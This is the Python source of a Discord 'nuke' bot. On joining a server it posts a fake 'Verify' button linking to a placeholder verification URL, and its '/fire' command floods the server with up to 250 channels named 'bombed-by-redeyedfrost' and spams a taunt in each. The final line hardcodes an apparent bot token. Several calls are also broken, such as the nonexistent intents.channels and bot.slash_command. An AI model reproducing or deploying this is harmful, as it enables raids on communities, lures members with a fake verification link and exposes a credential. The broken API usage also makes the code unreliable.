import discord
from discord.ext import commands
from discord.ui import Button, ButtonStyle

intents = discord.Intents.default()
intents.guilds = True
intents.channels = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')

@bot.event
async def on_guild_join(guild):
    # Send an embedded message when the bot is added to the server
    embed = discord.Embed(
        title='',
        description='Click the button to verify and gain access to the server!',
        color=discord.Color.red()
    )
    button = Button(style=ButtonStyle.red, label='Verify', url='https://example.com/verification')  # Replace 'https://example.com/verification' with your verification link
    view = discord.ui.View(button)
    await guild.system_channel.send(embed=embed, view=view)

    # Create a channel named 'verify-here'
    await guild.create_text_channel('verify-here')

@bot.slash_command(name='fire', description='Create channels')
async def fire(ctx, num_channels: int = 250):
    if num_channels > 250:
        await ctx.send("You can't create more than 250 channels at once.")
        return

    guild = ctx.guild

    for i in range(num_channels):
        channel_name = f'bombed-by-redeyedfrost_{i + 1}'
        new_channel = await guild.create_text_channel(channel_name)
        await new_channel.send("Rip bozo + RedEyedFrost on TOP")

    await ctx.send(f'{num_channels} channels created!')

# Run the bot with your token
bot.run('MTE3MjU2NDk1NDcyNjAyNzMxNA.GzddOz.EQkgkTf2VRn65bbZJXDTvZ6mTAhIpMg22a0deA')
